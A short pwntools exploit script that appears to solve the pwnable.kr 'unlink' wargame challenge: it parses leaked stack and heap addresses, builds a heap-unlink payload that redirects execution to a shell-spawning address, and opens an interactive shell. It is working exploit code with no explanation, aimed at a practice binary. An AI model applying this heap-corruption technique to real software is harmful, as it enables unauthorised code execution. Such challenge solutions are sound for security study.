from pwn import *

#ssh = ssh(user='unlink',host='pwnable.kr',port=2222,password='guest')
#s = ssh.process("/home/unlink/unlink")

s = process("./unlink")

s.recvuntil("here is stack address leak: ")
stack = s.recvuntil("\n")
s.recvuntil("here is heap address leak: ")
heap = s.recvuntil("\n")

stack = int(stack.replace("\n",""),16)
heap = int(heap.replace("\n",""),16)

log.success("stack : " + hex(stack))
log.success("heap : " + hex(heap))

oneshot = 0x080484eb

pay = p32(oneshot)
pay += "a"*12
pay += p32(stack+12)
pay += p32(heap+12)

s.sendlineafter("get shell!\n",pay)
s.interactive()
